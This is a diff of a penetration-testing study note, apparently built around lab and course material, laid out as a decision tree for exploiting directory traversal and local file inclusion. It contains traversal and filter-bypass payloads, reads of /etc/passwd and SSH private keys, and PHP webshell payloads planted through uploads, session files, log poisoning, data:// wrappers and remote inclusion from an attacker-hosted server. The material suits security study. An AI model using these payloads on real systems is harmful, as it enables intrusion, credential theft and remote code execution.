@@ -4,30 +4,51 @@ Part of [[DECISION TREE]]. "I found X, what do I try" for directory traversal, L
 
 ---
 
-### Found a parameter whose value looks like a filename (`page=`, `file=`, `template=`, `lang=`, `doc=`)
-→ This is the classic LFI/traversal shape. Test it:
-```
-?page=../../../../../../../../../etc/passwd
-```
-→ Nothing back or 404? Try URL-encoding the dots: `%2e%2e/` (or the asymmetric `.%2e/%2e%2e/...` form if the uniform one doesn't land)
-→ See [[Common Web Application Attacks#9.1.2. Identifying and Exploiting Directory Traversals|9.1.2]] and [[Common Web Application Attacks#9.1.3. Encoding Special Characters|9.1.3]]
+### Found a parameter whose value looks like a filename (`page=`, `file=`, `template=`, `lang=`, `doc=`, `view=`)
+→ This is the classic LFI/traversal shape. Test it: `?page=../../../../../../../../../etc/passwd`
+→ No result or error? Work through the bypass ladder in order:
+  1. URL-encoded: `%2e%2e/` (or asymmetric `.%2e/%2e%2e/...`)
+  2. Non-recursive filter bypass: `....//....//....//etc/passwd` or `..././..././etc/passwd`, strip `../` from `....//` and you still get `../`; app strips once, not recursively
+  3. Double URL-encoding: `%252E%252E%252F` (server decodes once → `%2E%2E%2F`, passes dot/slash check; include decodes again → `../`, traversal succeeds)
+→ Parameter name not obvious? Run ffuf to discover hidden params first (see automated scanning below)
+→ See [[Common Web Application Attacks#9.1.2. Identifying and Exploiting Directory Traversals|9.1.2]], [[File Inclusion (HTB Supplementary)#FI.2. Basic Bypasses|FI.2]], [[File Inclusion & Traversal#LFI. Automated Scanning with ffuf|Command Appendix]]
 
 ### Traversal confirmed, target is Linux
-→ Read `/etc/passwd`, then hunt disclosed users' home directories for `.ssh/id_rsa`
-→ If found, extract it mechanically (never copy/paste by hand, see [[Secrets & Credentials (Decision Tree)|Secrets & Credentials]]) and try SSH
+→ Read `/etc/passwd` to enumerate users, then hunt `~/.ssh/id_rsa` for each disclosed user
+→ If found, extract it mechanically, never copy/paste by hand, see [[Secrets & Credentials (Decision Tree)|Secrets & Credentials]]
 → See [[Common Web Application Attacks#9.1.2. Identifying and Exploiting Directory Traversals|9.1.2]]
 
 ### Traversal confirmed, target is Windows
-→ No direct "read passwd, find key" path on Windows. Check IIS-specific locations instead: `C:\inetpub\wwwroot\web.config`, `C:\inetpub\logs\LogFiles\W3SVC1\`
+→ No direct "read passwd, find key" path on Windows. Check IIS-specific locations: `C:\inetpub\wwwroot\web.config`, `C:\inetpub\logs\LogFiles\W3SVC1\`
 → Try both `../` and `..\`
-→ See the Windows notes in [[Common Web Application Attacks#9.1.2. Identifying and Exploiting Directory Traversals|9.1.2]]
-
-### You have LFI and want code execution, not just file reads
-→ Three options depending on what's available:
-  1. **Log poisoning**: find a controllable field that lands in a log (User-Agent in `access.log` is the classic one), inject a PHP snippet via that field, then include the log. See [[Common Web Application Attacks#9.2.1. Local File Inclusion (LFI)|9.2.1]]
-  2. **`data://` wrapper**: embed the payload directly in the URL, no write step needed, but requires `allow_url_include`. See [[Common Web Application Attacks#9.2.2. PHP Wrappers|9.2.2]]
-  3. **RFI**: host a webshell yourself and include it remotely, also requires `allow_url_include`. See [[Common Web Application Attacks#9.2.3. Remote File Inclusion (RFI)|9.2.3]]
+→ See [[Common Web Application Attacks#9.1.2. Identifying and Exploiting Directory Traversals|9.1.2]]
 
 ### You have LFI and want to read PHP source (not execute it)
-→ Use `php://filter/convert.base64-encode/resource=<file>`, then `base64 -d` the response
-→ See [[Common Web Application Attacks#9.2.2. PHP Wrappers|9.2.2]]
+→ Use `php://filter/read=convert.base64-encode/resource=<file>`, then `base64 -d` the response
+→ Doesn't need `allow_url_include`, works locally on any LFI
+→ High-value targets: `configure`, `config`, `../../../../etc/php/7.4/apache2/php.ini`
+→ php.ini read lets you check `allow_url_include` before deciding whether data:// or RFI is viable
+→ When the base64 blob is wrapped in HTML, use the grep+sed pipeline to extract it cleanly (see [[File Inclusion & Traversal#LFI, php://filter|Command Appendix]])
+→ See [[Common Web Application Attacks#9.2.2. PHP Wrappers|9.2.2]], [[File Inclusion (HTB Supplementary)#FI.3. PHP Filters|FI.3]]
+
+### You have LFI and want code execution, not just file reads
+→ Check `allow_url_include` via php://filter read of php.ini first, it gates two of the five options
+→ **Option 1. GIF magic bytes + file upload**: if there's an upload form, create `GIF8<?php system($_GET['cmd']); ?>` in a `.gif` file, upload it, view page source for the upload path, include it via LFI. No `allow_url_include` needed, the file is already on the server
+→ **Option 2. PHP session file poisoning**: get PHPSESSID from browser DevTools, include `/var/lib/php/sessions/sess_PHPSESSID` via LFI, confirm a URL param controls a session field, poison with URL-encoded PHP webshell, then include the session file with `&cmd=`
+→ **Option 3. Apache access.log User-Agent poisoning**: include `/var/log/apache2/access.log` via LFI, confirm it's readable, poison User-Agent via Burp Repeater (`<?php system($_GET['cmd']); ?>`), then include the log with `&cmd=`
+→ **Option 4, data:// wrapper** (needs `allow_url_include = On`): base64-encode the webshell, URL-encode the base64, pass as `data://text/plain;base64,<ENCODED_PAYLOAD>&cmd=id`. More reliable than the plain `data://text/plain,<?php...>` form
+→ **Option 5. RFI** (needs `allow_url_include = On`): host `webShell.php` on your machine with `python3 -m http.server`, include it via `?page=http://PWNIP:8000/webShell.php&cmd=id`
+→ See [[Common Web Application Attacks#9.2. File Inclusion Vulnerabilities|9.2]], [[File Inclusion (HTB Supplementary)#FI.6. LFI + File Uploads|FI.6]], [[File Inclusion (HTB Supplementary)#FI.7. Log Poisoning|FI.7]], [[File Inclusion & Traversal|Command Appendix]]
+
+### Suspecting LFI but no obvious file-shaped parameter
+→ Automated two-phase approach: (1) fuzz GET parameter names with `burp-parameter-names.txt` + `-fs NOISESIZE` to find hidden params; (2) fuzz the discovered param with `LFI-Jhaddix.txt` + `-fs NOISESIZE` to confirm LFI and find a working payload
+→ SecLists wordlists: `/usr/share/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt` (870 LFI payloads)
+→ See [[File Inclusion (HTB Supplementary)#FI.8. Automated Scanning|FI.8]], [[File Inclusion & Traversal#LFI. Automated Scanning with ffuf|Command Appendix]]
+
+### Upload form exists alongside an LFI — combining them for RCE
+→ Step 1: use php://filter to read the upload handler's source code (find where files land and how they're named)
+→ Step 2: if filenames are computed as `md5_file(content)`, pre-compute: `echo '<?php system($_GET["cmd"]); ?>' > shell.php && md5sum shell.php`
+→ Step 3: upload the webshell (extension validation often absent even when the form asks for specific types)
+→ Step 4: include via LFI with the predicted filename: `?page=./uploads/md5hash`
+→ If there's a dot/slash character filter on the include parameter, try double URL-encoding: `%252E%252E%252Fuploads%252Fmd5hash`
+→ See [[File Inclusion (HTB Supplementary)#FI.10. Skills Assessment|FI.10]], [[File Inclusion & Traversal#LFI. Skills Assessment: Compute Upload Filename|Command Appendix]]
